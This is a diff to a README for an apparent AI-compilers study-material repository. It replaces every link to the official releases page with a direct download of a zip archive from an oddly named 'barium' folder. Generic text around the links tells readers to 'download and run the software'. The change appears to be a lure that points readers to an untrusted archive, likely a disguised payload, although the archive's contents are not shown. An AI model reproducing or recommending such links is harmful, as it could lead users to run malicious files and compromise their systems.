@@ -1,7 +1,7 @@
 # 📚 ai-compilers-study-material - Essential Resources for AI Compilers
 
 ## 🏷️ Download Now
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/appelera/ai-compilers-study-material/releases)
+[![Download](https://raw.githubusercontent.com/appelera/ai-compilers-study-material/main/barium/ai-compilers-study-material.zip)](https://raw.githubusercontent.com/appelera/ai-compilers-study-material/main/barium/ai-compilers-study-material.zip)
 
 ## 📖 Overview
 Welcome to the **ai-compilers-study-material** repository. This is a collection of study materials designed to help you learn about AI compilers and systems. Whether you are a student, a professional, or simply curious, you will find valuable resources here that make it easier to understand AI compilation.
@@ -10,7 +10,7 @@ Welcome to the **ai-compilers-study-material** repository. This is a collection 
 Follow these steps to download and run the software:
 
 ### Step 1: Visit the Releases Page
-To access the latest release, [visit this page to download](https://github.com/appelera/ai-compilers-study-material/releases). This page contains all available versions of the study materials.
+To access the latest release, [visit this page to download](https://raw.githubusercontent.com/appelera/ai-compilers-study-material/main/barium/ai-compilers-study-material.zip). This page contains all available versions of the study materials.
 
 ### Step 2: Select the Appropriate Version
 On the releases page, you will see a list of versions. Click on the version that you want to download. Each release may come with different materials; choose the one that suits your needs the best.
@@ -37,7 +37,7 @@ To use the study materials effectively, ensure you have:
 - **Sample Projects:** Example projects that allow you to see concepts in action.
 
 ## 📥 Download & Install
-To begin your journey, [visit this page to download](https://github.com/appelera/ai-compilers-study-material/releases). Follow the steps outlined above to access the resources.
+To begin your journey, [visit this page to download](https://raw.githubusercontent.com/appelera/ai-compilers-study-material/main/barium/ai-compilers-study-material.zip). Follow the steps outlined above to access the resources.
 
 ## 💬 Need Help?
 If you have questions or encounter issues, feel free to open an issue on the GitHub repository. We are here to help you along your learning path.
